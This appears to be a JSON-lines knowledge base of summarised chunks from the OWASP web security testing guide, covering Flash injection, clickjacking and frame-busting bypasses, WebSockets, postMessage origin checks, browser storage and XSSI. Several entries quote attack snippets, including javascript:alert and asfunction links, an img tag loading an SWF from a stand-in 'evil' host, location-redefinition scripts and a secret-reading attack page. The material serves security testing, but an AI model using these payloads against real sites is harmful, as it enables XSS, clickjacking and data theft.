{"id": "kb-001737", "section": null, "tags": ["API"], "source": "wstg-v4.2.pdf", "text": "Security changes in Flash Player: The asfunction protocol allows ActionScript functions to be executed instead of opening a URL, but after Flash Player 9 r48, its usage was restricted to HTML TextFields. This represents a significant change in how Flash applications can be tested for security vulnerabilities."}
{"id": "kb-001738", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The method `ExternalInterface.call` is introduced by Adobe for enhanced interactions between Flash and browsers, relevant in both ActionScript 2.0 and 3.0."}
{"id": "kb-001739", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "From a security perspective, `ExternalInterface.call` can be exploited if an argument can be manipulated, allowing for potential harmful code execution such as `eval(evilcode)`."}
{"id": "kb-001740", "section": null, "tags": ["XSS"], "source": "wstg-v4.2.pdf", "text": "HTML Injection vulnerability occurs when TextField objects are used to render HTML via the property `tf.html = true`, enabling the embedding of HTML code that can lead to Cross-Site Scripting (XSS) attacks if user inputs are improperly validated."}
{"id": "kb-001741", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "Possible attack vectors include using `<a>` tags to execute JavaScript directly, such as `<a href='javascript:alert(123)'>` or calling functions via Flash with `<a href='asfunction:function,arg'>`."}
{"id": "kb-001742", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Another abuse of HTML injection can involve embedding `<img>` tags that load content from an external source, like `<img src='http://evil/evil.swf'>`, which could load malicious SWF files."}
{"id": "kb-001743", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "In web security testing, bypassing filters is a crucial tactic which can involve exploiting certain file types. In the given example, the use of the file type '.swf' is highlighted as a method to bypass the Flash Player internal filter."}
{"id": "kb-001744", "section": null, "tags": ["CRYPTO", "XSS"], "source": "wstg-v4.2.pdf", "text": "Flash Player 9.0.124.0 introduced changes that made XSS (Cross-Site Scripting) attacks no longer exploitable, although GUI (Graphical User Interface) modifications could still be performed. Several tools are recommended for working with SWF files: 1. **Adobe SWF Investigator** - a tool used for analyzing SWF files. 2. **OWASP SWFIntruder** - a testing tool provided by OWASP for finding security issues in SWF files. 3. **Decompiler – Flare** - a decompiler for converting SWF files back to their source code for analysis. 4. **Disassembler – Flasm** - used to disassemble SWF files for deep inspection of their operations. 5. **Swfmill** - a tool that can convert SWF files to XML and vice versa, allowing for deeper manipulation and analysis."}
{"id": "kb-001745", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Clickjacking is a malicious technique that misleads a web user into interacting with an element that is different from what they believe they are interacting with. This attack can send unauthorized commands or leak confidential information while the victim seems to interact with harmless pages. The term 'clickjacking' was first introduced by Jeremiah Grossman and Robert Hansen in 2008."}
{"id": "kb-001746", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "Clickjacking utilizes HTML and JavaScript features to force users to perform undesired actions, such as clicking on an invisible button that triggers unintended operations. It is particularly noted as a client-side security issue that can affect various browsers and platforms. Attackers create a web page that loads a target application in an inline frame, which can be disguised with CSS code."}
{"id": "kb-001747", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Social engineering techniques are often used by attackers to encourage victims to interact with their manipulated web page, increasing the chance of a successful attack."}
{"id": "kb-001748", "section": null, "tags": ["AUTHN", "SESSION"], "source": "wstg-v4.2.pdf", "text": "A prerequisite for clickjacking attacks is that the victim needs to be authenticated on the target website, allowing the attacker to exploit that session."}
{"id": "kb-001749", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Clickjacking is a security vulnerability that allows an attacker to trick users into performing actions they did not intend to, by layering a hidden element on top of a legitimate webpage."}
{"id": "kb-001750", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "In clickjacking, the victim believes they are interacting with a visible user interface when they are actually performing actions on a hidden page controlled by the attacker."}
{"id": "kb-001751", "section": null, "tags": ["AUTHN", "CSRF"], "source": "wstg-v4.2.pdf", "text": "Effective anti-CSRF (Cross-Site Request Forgery) protections can sometimes be bypassed through clickjacking attacks, as actions appear to originate from an authentic target page."}
{"id": "kb-001752", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The primary objective of testing for clickjacking vulnerabilities is to understand and assess the security measures in place and evaluate their effectiveness against potential bypass methods."}
{"id": "kb-001753", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "To test for clickjacking vulnerabilities, testers can create a simple HTML page that includes an iframe containing the target webpage; if the target page loads in the iframe, it indicates a weak point in security."}
{"id": "kb-001754", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "An example of testing HTML code for detecting clickjacking vulnerabilities is provided: <html><head><title>Clickjack test page</title></head><body><iframe src='http://www.target.site' width='500' height='500'></iframe></body></html>."}
{"id": "kb-001755", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Bypass Clickjacking Protection is a technique used to assess the security measures against clickjacking on web pages, although the presence of protection does not guarantee immunity."}
{"id": "kb-001756", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Clickjacking defense mechanisms can be categorized, and specific workarounds can bypass them, underlining the need for robust security measures."}
{"id": "kb-001757", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "Frame Busting is a client-side method aimed at preventing web pages from being displayed within frames, typically by using scripts that block such functionality."}
{"id": "kb-001758", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The structure of frame busting code involves a conditional statement followed by a counter-action statement to redirect the user's location if a framing attempt is detected."}
{"id": "kb-001759", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Despite the protection offered by frame busting, attackers can sometimes 'bust frame busting' through browser-specific techniques or alternative methods that do not engage frame busting defenses."}
{"id": "kb-001760", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Mobile website versions are often less complex and may not implement the same level of protection against clickjacking, leading to vulnerabilities that can be exploited by attackers."}
{"id": "kb-001761", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Double Framing technique refers to the scenario where a website is framed within multiple layers of frames, making frame busting techniques ineffective due to security policy violations in browsers."}
{"id": "kb-001762", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "Example frame busting code structure: `if(top.location!=self.location) { parent.location = self.location; }` which is intended to redirect the parent frame back to the original content if an unauthorized frame is detected. Disabling JavaScript can nullify client-side protections against clickjacking, as these protections rely on JavaScript frame-busting code. There are three techniques for deactivating frames to enhance security:"}
{"id": "kb-001763", "section": null, "tags": ["API", "CLIENT", "HTTP"], "source": "wstg-v4.2.pdf", "text": "1. **Restricted frames in Internet Explorer**: Starting from IE6, the 'security' attribute can be set to 'restricted' to prevent JavaScript, ActiveX controls, and redirects within the frame. Example syntax: <iframe src='http://example.org' security='restricted'></iframe>"}
{"id": "kb-001764", "section": null, "tags": ["API", "HTTP"], "source": "wstg-v4.2.pdf", "text": "2. **Sandbox attribute in HTML5**: This attribute applies restrictions on iframe content, although it's only currently compatible with Chrome and Safari. Example syntax: <iframe src='http://example.org' sandbox></iframe>"}
{"id": "kb-001765", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "3. **Design mode**: Activating the 'designMode' can disable JavaScript in both top frames and sub-frames. This feature is implemented in Firefox and IE8."}
{"id": "kb-001766", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The `onBeforeUnload` event can evade frame-busting code by prompting the user about leaving the website when the frame buster attempts to load a different URL. Example usage involves setting a function that triggers a confirmation string."}
{"id": "kb-001767", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "An alternative method for the attacker can automatically cancel navigation requests in an onBeforeUnload event handler. By continually submitting a navigation request to a page that responds with 'HTTP/1.1 204 No Content', the original frame-busting attempt becomes ineffective, as the browser will refrain from any display actions."}
{"id": "kb-001768", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Code Example of 204 Page: The code demonstrates how to send a '204 No Content' HTTP response using PHP, which can be part of a security testing strategy."}
{"id": "kb-001769", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Attacker’s Script Example: The script provided illustrates how an attacker might manipulate the browser's unload event to repeatedly redirect the top window to a malicious page, showcasing a potential security threat."}
{"id": "kb-001770", "section": null, "tags": ["XSS"], "source": "wstg-v4.2.pdf", "text": "XSS Filters: The page discusses XSS filters implemented in browsers like Google Chrome and IE8, which are designed to protect users from reflected XSS attacks by disabling inline scripts (including frame busting scripts) when they detect a potential attack."}
{"id": "kb-001771", "section": null, "tags": ["XSS"], "source": "wstg-v4.2.pdf", "text": "IE8 XSS Filter: This filter analyzes request and response parameters against a set of regular expressions to identify reflected XSS attempts, effectively rendering frame busting code inoperative if a potential XSS attack is detected."}
{"id": "kb-001772", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Frame Busting Code Example: A snippet of code is provided to showcase how a webpage might implement frame busting to prevent clickjacking attacks by checking if the current window is not the top window, and if so, redirects it to itself."}
{"id": "kb-001773", "section": null, "tags": ["XSS"], "source": "wstg-v4.2.pdf", "text": "Chrome 4.0 XSS Auditor Behavior: This filter behaves differently from IE8’s filter, allowing an attacker to deactivate frame busting code by injecting part of the script into the request parameters, demonstrating the complexities of security in modern web browsers."}
{"id": "kb-001774", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Redeﬁning location in Internet Explorer (IE) and Safari can be exploited to evade frame busting code, as 'document.location' is immutable in some browsers but not in others."}
{"id": "kb-001775", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "In Internet Explorer 7 and 8, 'location' can be redeﬁned using: <script> var location = 'xyz'; </script>, causing frame-busting code using 'top.location' to trigger a security violation and become ineffective."}
{"id": "kb-001776", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "In Safari 4.0.4, one can bind 'location' to a function using 'window.defineSetter', causing attempts to read or navigate 'top.location' to fail: <script> window.defineSetter('location', function(){}); </script>."}
{"id": "kb-001777", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "The 'X-FRAME-OPTIONS' HTTP header is a server-side defense against clickjacking, indicating that a web page should not be framed. Possible values are: DENY, SAMEORIGIN, ALLOW-FROM origin, and non-standard ALLOWALL, with DENY being the preferred setting."}
{"id": "kb-001778", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "'X-FRAME-OPTIONS' was introduced in 2009 and is not compatible with older browsers, leaving users with outdated browsers vulnerable to clickjacking attacks. The lowest supported version is Internet Explorer 8.0."}
{"id": "kb-001779", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Web proxies can inadvertently strip security headers like 'X-FRAME-OPTIONS', which compromises a website's protection against clickjacking attacks."}
{"id": "kb-001780", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "The 'X-FRAME-OPTIONS' header must be implemented on every page of a website to ensure comprehensive protection, including its mobile version."}
{"id": "kb-001781", "section": null, "tags": ["CSRF"], "source": "wstg-v4.2.pdf", "text": "A Proof of Concept (PoC) can be developed to demonstrate vulnerabilities such as clickjacking, which can lead to more harmful attacks, including CSRF (Cross-Site Request Forgery)."}
{"id": "kb-001782", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "An example given involves a banking website where a user must confirm a transfer of money in multiple steps, indicating that a clickjacking attack could manipulate these steps to execute unauthorized actions."}
{"id": "kb-001783", "section": null, "tags": ["CLIENT", "CSRF"], "source": "wstg-v4.2.pdf", "text": "The code snippet provided showcases how a random anti-CSRF token is generated and used within a form to protect against CSRF attacks. It is crucial to validate this token to secure the transaction process."}
{"id": "kb-001784", "section": null, "tags": ["CSRF", "SESSION"], "source": "wstg-v4.2.pdf", "text": "The code snippet demonstrates an anti-CSRF (Cross-Site Request Forgery) protection mechanism that uses a token stored in the session and submitted via POST method to authorize a money transfer."}
{"id": "kb-001785", "section": null, "tags": ["CSRF", "SESSION"], "source": "wstg-v4.2.pdf", "text": "The logic checks whether the anti-CSRF token in the current session matches the one provided in the POST request, thus ensuring that the request is legitimate and not forged by an attacker."}
{"id": "kb-001786", "section": null, "tags": ["CSRF", "HTTP"], "source": "wstg-v4.2.pdf", "text": "The code lacks input sanitization for simplicity; however, this omission is highlighted as a caveat that doesn't affect the demonstration of CSRF protection."}
{"id": "kb-001787", "section": null, "tags": ["CSRF"], "source": "wstg-v4.2.pdf", "text": "Despite the anti-CSRF protections in place, the application is vulnerable to CSRF combined with Clickjacking because developers implemented security controls only at the last step of the transaction process, thus exposing the earlier stages to attacks."}
{"id": "kb-001788", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Clickjacking can trick users into interacting with elements of a web page without their knowledge, leading to unintended actions such as unauthorized money transfers. An advanced form of Clickjacking can even force users to fill out forms, making the attack feasible even when user input is required."}
{"id": "kb-001789", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The description of the attacker’s page emphasizes the deceptive nature of Clickjacking, where an innocent-looking web page overlays a target page, making it difficult for users to realize their actions could be malicious."}
{"id": "kb-001790", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The provided code snippet illustrates an example of clickjacking, a web security vulnerability where a malicious page tricks a user into clicking on something different from what the user perceives, potentially leading to unauthorized actions."}
{"id": "kb-001791", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "In the code, a trusted web page is styled to appear legitimate. The layer of clickjacking is positioned absolutely with `opacity` set to `0`, making it invisible to the user, yet still functional to capture clicks."}
{"id": "kb-001792", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Key aspects of the design include various CSS properties used to manipulate layout and visibility, such as `margin`, `padding`, `background`, and `position`."}
{"id": "kb-001793", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Clickjacking is a malicious technique that tricks a user into clicking on a concealed link or button, usually resulting in unintended actions like form submissions. This can occur when an iframe is masked and positioned over legitimate elements on a webpage to deceive the user."}
{"id": "kb-001794", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "In the illustrated example, an iframe is used to conceal a malicious action (form submission) in such a way that it visually aligns with the legitimate button \"Click and go!\"."}
{"id": "kb-001795", "section": null, "tags": ["AUTHZ"], "source": "wstg-v4.2.pdf", "text": "Advanced clickjacking techniques can further exploit this concept by coercing users into inputting sensitive data or changing their settings without their consent. CSS can play a crucial role in skillfully covering a malicious iframe to simulate a legitimate user interface."}
{"id": "kb-001796", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "WebSockets enable full-duplex communication channels between clients and servers, which differs from the traditional half-duplex model of HTTP and AJAX."}
{"id": "kb-001797", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "After the initial handshake over HTTP, WebSocket communication occurs over TCP channels using frames, enhancing the ability to maintain asynchronous communication."}
{"id": "kb-001798", "section": null, "tags": ["CSRF"], "source": "wstg-v4.2.pdf", "text": "It is essential for servers to validate the Origin header during the WebSocket handshake to prevent cross-domain communication which can lead to CSRF-like vulnerabilities."}
{"id": "kb-001799", "section": null, "tags": ["CRYPTO", "HTTP", "XSS"], "source": "wstg-v4.2.pdf", "text": "WebSockets can operate over both unencrypted (ws://) and encrypted (wss://) connections, with the latter using TLS for enhanced security against sensitive data exposure. Proper input sanitization and encoding are critical when handling data from untrusted sources to protect against injection attacks and XSS."}
{"id": "kb-001800", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "Testing WebSockets involves steps such as inspecting client-side source code, using tools like Google Chrome’s Developer Tools and ZAP to analyze WebSocket communication, and ensuring connections utilize SSL for sensitive information."}
{"id": "kb-001801", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Web Security Testing involves checking the SSL implementation for security issues such as valid certificates and vulnerabilities like BEAST, CRIME, and RC4."}
{"id": "kb-001802", "section": null, "tags": ["AUTHN", "AUTHZ"], "source": "wstg-v4.2.pdf", "text": "WebSockets do not manage authentication; therefore, standard black-box authentication tests should still be performed according to established methodologies. Similarly, WebSockets do not handle authorization, necessitating conventional black-box authorization testing to be applied."}
{"id": "kb-001803", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Input sanitization for WebSockets can be conducted using tools such as OWASP Zed Attack Proxy (ZAP), specifically leveraging its WebSocket tab for replaying and fuzzing WebSocket requests and responses."}
{"id": "kb-001804", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Example 1 illustrates the process of using OWASP ZAP to intercept WebSocket traffic, allowing security testers to replay and fuzz these communications to uncover vulnerabilities."}
{"id": "kb-001805", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Example 2 highlights a practical method where security testers can use a WebSocket client to connect to a server and test if the server is validating the origin header during WebSocket handshakes, potentially exposing cross-domain communication vulnerabilities."}
{"id": "kb-001806", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Gray-box testing combines aspects of both black-box and white-box testing methodologies. In this approach, the pen-tester has partial knowledge of the application, which can lead to more effective testing outcomes."}
{"id": "kb-001807", "section": null, "tags": ["API"], "source": "wstg-v4.2.pdf", "text": "Unlike black-box testing, gray-box testing provides the tester with access to certain documentation such as API specifications, which sets it apart by facilitating an understanding of expected WebSocket requests and responses. This knowledge can improve the targeted nature of the testing process and increase the chances of identifying vulnerabilities."}
{"id": "kb-001808", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Key tools mentioned for conducting gray-box testing on WebSockets include OWASP Zed Attack Proxy (ZAP), which is a popular tool for finding security vulnerabilities in web applications, and specific WebSocket client tools that can help in crafting and sending WebSocket messages, such as the Google Chrome Simple WebSocket Client."}
{"id": "kb-001809", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Web Messaging, also known as Cross Document Messaging, allows secure communication between applications running on different domains, overcoming the limitations of the same origin policy."}
{"id": "kb-001810", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Before the advent of Web Messaging, developers had to rely on insecure hacks to enable communication between different origins, which posed significant security risks."}
{"id": "kb-001811", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Cross Document Messaging was introduced in the WHATWG HTML5 draft and is supported by all major browsers, facilitating secure data exchange across iframes, tabs, and windows."}
{"id": "kb-001812", "section": null, "tags": ["API"], "source": "wstg-v4.2.pdf", "text": "The postMessage() method is central to the messaging API, allowing plain-text messages to be sent across different origins with its two parameters: the message and the domain."}
{"id": "kb-001813", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "The receiving website must set up an event handler to listen for incoming messages, which provides three attributes: Data (the message content), Origin (the sender's document origin), and Source (the source window). Example of sending a message using Web Messaging: `iframe1.contentWindow.postMessage(\"Hello world\", \"http://www.example.com\");`"}
{"id": "kb-001814", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Example of receiving a message: Setting up an event listener with `window.addEventListener(\"message\", handler, true);` where the `handler` function processes the incoming message based on the origin."}
{"id": "kb-001815", "section": null, "tags": ["API", "HTTP"], "source": "wstg-v4.2.pdf", "text": "The concept of origin is crucial, consisting of a scheme (e.g., http or https), host name, and port, which uniquely identifies the source of a message. Assessing the security of the message’s origin is critical in web security testing. Testers should ensure that application code filters and processes messages only from trusted domains. The second argument of postMessage() should not be * to prevent security concerns related to data leakage to untrusted hosts. If security controls are not in place to restrict domains that can send messages, it increases the risk of security vulnerabilities. Code for message event listeners should be examined to ensure domains are verified before manipulating data from messages. Input must be treated as untrusted data even if it originates from trusted domains; appropriate security controls must be employed."}
{"id": "kb-001816", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "Analyze the JavaScript code to understand the web messaging implementation and how it handles messages from both trusted and untrusted domains."}
{"id": "kb-001817", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "An example code snippet demonstrates a weakness where a domain filter can be bypassed by an attacker: `if(e.origin.indexOf(\".owasp.org\")!=-1)` could allow malicious domains."}
{"id": "kb-001818", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Code lacks strict origin checking, making it vulnerable as it accepts input from any domain: `function callback(e) { /* process message (e.data) */ }` which should be avoided in secure coding practices."}
{"id": "kb-001819", "section": null, "tags": ["CLIENT", "HTTP", "XSS"], "source": "wstg-v4.2.pdf", "text": "Input validation vulnerabilities can lead to XSS (Cross-Site Scripting) attacks, especially when using functions that manipulate the DOM based on user input. Using innerHTML allows for executing code that could be malicious; thus, it is more secure to use innerText to prevent XSS vulnerabilities."}
{"id": "kb-001820", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The code snippet shows an event listener for messages, checking for a trusted origin before processing the message to mitigate security risks."}
{"id": "kb-001821", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "It's important to refer to established resources such as the OWASP HTML5 Security Cheat Sheet for guidelines on secure web messaging practices."}
{"id": "kb-001822", "section": null, "tags": ["CLIENT", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Browsers provide several client-side storage mechanisms for developers, including Local Storage, Session Storage, IndexedDB, Web SQL (deprecated), and Cookies. These can be accessed through browser developer tools like Google Chrome DevTools or Firefox’s Storage Inspector."}
{"id": "kb-001823", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Local Storage allows for persistent key-value storage within the browser, where both keys and values are strings. Non-string values need to be converted to strings using JSON.stringify before storage. Local Storage persists even after the browser is closed, except in Private/Incognito mode, and its storage capacity can differ by browser."}
{"id": "kb-001824", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "To list all key-value entries in Local Storage, the following JavaScript code can be used:\nfor (let i = 0; i < localStorage.length; i++) {\nconst key = localStorage.key(i);\nconst value = localStorage.getItem(key);\nconsole.log(`${key}: ${value}`);\n}"}
{"id": "kb-001825", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Session Storage provides ephemeral storage in the browser that only lasts for the duration of the page session. This means that data stored in sessionStorage is lost when the tab or browser is closed. Session storage values must be strings, and non-string values should be converted using JSON.stringify before storage. Entries in sessionStorage are cleared when the browser tab or window is closed, leading to ephemeral data management. The maximum storage capacity of sessionStorage can vary between different browsers."}
{"id": "kb-001826", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "IndexedDB is a transactional and object-oriented database designed for structured data, allowing for multiple object stores and complex objects. Unlike Local Storage and Session Storage, IndexedDB can store complex objects, including those handled by the structured clone algorithm. An example of an object that can be stored in IndexedDB but not in Local/Session Storage is a CryptoKey."}
{"id": "kb-001827", "section": null, "tags": ["API"], "source": "wstg-v4.2.pdf", "text": "For security, the W3C Web Crypto API recommends storing CryptoKeys that need to persist in IndexedDB and ensuring they are not extractable during cryptographic operations. The code snippet provided lists all key-value entries in sessionStorage, demonstrating how to access and log stored data to the console."}
{"id": "kb-001828", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The code to print all contents of IndexedDB iterates through databases and object stores and retrieves items for display, highlighting how IndexedDB management works."}
{"id": "kb-001829", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Web SQL is deprecated and should not be used by web developers, indicating the importance of observing current best practices in web development. Cookies are a key-value storage mechanism used primarily for session management, but they can also be used to store arbitrary string data. To list all cookies in a web document, the code snippet 'console.log(window.document.cookie);' can be used to display current cookies."}
{"id": "kb-001830", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The global Window object can maintain global state specific to the runtime life of the page by assigning custom attributes to it, for example: 'window.MY_STATE = { counter: 0, flag: false };'. Data attached to the Window object is lost when the page is refreshed or closed, which limits the long-term storage of state information."}
{"id": "kb-001831", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "To list all entries on the Window object, a JavaScript snippet is provided that creates an iframe to load a clean window object and compares properties between the current and clean window objects, logging any discrepancies."}
{"id": "kb-001832", "section": null, "tags": ["CLIENT", "SESSION", "XSS"], "source": "wstg-v4.2.pdf", "text": "Following the identification of attack vectors such as those involving cookies and the global Window object, an attack chain can be constructed involving client-side attacks like DOM-based XSS."}
{"id": "kb-001833", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "Best practices for web security recommend that sensitive data should be stored on the server-side rather than the client-side to enhance security."}
{"id": "kb-001834", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Cross Site Script Inclusion (XSSI) is a vulnerability that allows for sensitive data leakage across-origin or cross-domain boundaries, involving sensitive data like authentication tokens and personal information."}
{"id": "kb-001835", "section": null, "tags": ["CLIENT", "CSRF"], "source": "wstg-v4.2.pdf", "text": "XSSI is a client-side attack distinct from Cross Site Request Forgery (CSRF) as it seeks to leak sensitive data instead of executing state-changing actions."}
{"id": "kb-001836", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Websites generally adhere to a same-origin policy to protect data access, which states that resources from different origins cannot be accessed by default, ensuring security."}
{"id": "kb-001837", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "However, the exception for HTML <script> tag inclusions facilitates third-party service consumption, which inadvertently allows for data leakage if not managed correctly."}
{"id": "kb-001838", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "When a browser processes a <script> tag from a cross-origin domain, it runs in the context of the including site, providing an opportunity for sensitive data leakage, often through JavaScript."}
{"id": "kb-001839", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Testers should identify sensitive data transmission endpoints and assess their responses under both authenticated and unauthenticated sessions to uncover potential XSSI vulnerabilities."}
{"id": "kb-001840", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "One important testing approach involves comparing responses for dynamically generated content against static content to identify possible leaks."}
{"id": "kb-001841", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "Tools like Burp proxy can assist testers in identifying vulnerabilities along with JavaScript analysis for various potential leakage points, including global variables and function parameters."}
{"id": "kb-001842", "section": null, "tags": ["API", "CLIENT"], "source": "wstg-v4.2.pdf", "text": "Sensitive Data Leakage via Global Variables is a method where an API key or sensitive data stored in a JavaScript file becomes accessible to an attacker using a <script> tag to load that file on a malicious site."}
{"id": "kb-001843", "section": null, "tags": ["API"], "source": "wstg-v4.2.pdf", "text": "Example: In the given scenario, an API key is exposed through a global variable `window.secret`, allowing it to be captured and displayed on an attack page through the code `div.innerHTML = 'Your secret data <b>' + window.secret + '</b>';`."}
{"id": "kb-001844", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "Sensitive Data Leakage via Global Function Parameters entails an attacker overwriting a victim's global JavaScript function to extract sensitive data. For example, if a victim site has a function that takes a secret as a parameter, the attacker can set this function up to access and utilize that secret."}
{"id": "kb-001845", "section": null, "tags": ["API", "CLIENT"], "source": "wstg-v4.2.pdf", "text": "Important quotes that emphasize the risk: 'The victim’s browser then fetches api.js, resulting in the sensitive data being leaked via the global JavaScript variable.'"}
{"id": "kb-001846", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Both examples demonstrate critical vulnerabilities in how sensitive data is handled in web applications, particularly emphasizing the risks associated with utilizing global variables and functions."}
{"id": "kb-001847", "section": null, "tags": ["CLIENT", "HTTP"], "source": "wstg-v4.2.pdf", "text": "XSSI vulnerabilities can lead to sensitive data leakage through methods such as JavaScript prototype chains or global function calls. This highlights the importance of careful input validation and access management in web applications."}
{"id": "kb-001848", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "The example of sensitive data leakage via CSV reveals that an attacker can inject JavaScript code into CSV data, utilizing certain columns to perform code injection. This is particularly relevant in contexts where CSVs are dynamically processed by web applications, increasing the risk of XSSI attacks."}
{"id": "kb-001849", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "The HTTP response code example provides context for how CSV data could be structured for transmission, indicating the settings required to facilitate data leaks. Understanding the correct structure helps recognize attack vectors in CSV handling."}
{"id": "kb-001850", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "The technique described in Takeshi Terada's whitepaper illustrates how an attacker can manipulate the structure of a CSV file to execute injected JavaScript, showcasing a sophisticated method of data theft through built-in web functionalities."}
{"id": "kb-001851", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "Jeremiah Grossman's 2006 vulnerability narrative concerning Gmail emphasizes the risks associated with improperly handled JavaScript functions. It warns that attackers can redefine core JavaScript constructors (like Array) to gain unauthorized access to sensitive data."}
{"id": "kb-001852", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The provided HTML snippet illustrates the methodology of a potential attacker who could define a malicious Array function, allowing them to intercept and manipulate data received from an external source, like Gmail. This draws attention to the need for protective coding practices when handling external scripts."}
{"id": "kb-001853", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "Sensitive Data Leakage via JavaScript Runtime Errors occurs when standardized JavaScript error messages are presented to the user, sometimes exposing sensitive information, particularly in older versions of Internet Explorer like IE9/10."}
{"id": "kb-001854", "section": null, "tags": ["AUTHN", "CLIENT"], "source": "wstg-v4.2.pdf", "text": "An example of sensitive data leakage provided is a scenario where an authenticated user attempts to access a CSV endpoint that inadvertently discloses its content via JavaScript errors."}
